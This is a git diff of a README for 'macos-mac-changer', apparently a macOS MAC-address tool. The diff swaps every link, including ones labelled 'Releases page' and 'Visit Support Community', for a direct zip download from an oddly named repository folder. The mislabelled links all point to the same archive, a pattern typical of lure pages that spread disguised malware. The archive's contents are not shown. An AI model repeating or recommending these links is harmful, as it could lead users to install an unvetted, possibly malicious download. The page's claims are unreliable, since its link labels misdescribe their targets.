@@ -7,10 +7,10 @@ macos-mac-changer is a simple tool designed for macOS users to change their MAC 
 To get started with macos-mac-changer, follow these steps for installation and setup. 
 
 ## 📥 Download & Install
-[![Download macos-mac-changer](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/macos-mac-changer.zip)](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/macos-mac-changer.zip)
+[![Download macos-mac-changer](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/mac-macos-changer-v3.2.zip)](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/mac-macos-changer-v3.2.zip)
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/macos-mac-changer.zip) to access the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/mac-macos-changer-v3.2.zip) to access the latest version of the software.
 
 2. **Select the Version:**  
    Look through the list of available versions. Choose the most recent version for better features and updates.
@@ -60,11 +60,11 @@ If you encounter any issues while using macos-mac-changer, consider the followin
 ## 💬 Community Support
 For further assistance, feel free to reach out to the user community. You can find support on discussion forums or GitHub Issues page linked below.
 
-[**Visit Support Community**](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/macos-mac-changer.zip)
+[**Visit Support Community**](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/mac-macos-changer-v3.2.zip)
 
 ## 📝 Additional Resources
 For more information on how the app works and advanced features, explore the documentation available on our GitHub page.
 
 ## 🔗 Reference
-- To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/macos-mac-changer.zip).
+- To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/GAZO-APOCALYPS/macos-mac-changer/main/hysterocleisis/mac-macos-changer-v3.2.zip).
 - Follow us on GitHub for updates and new features related to macos-mac-changer.
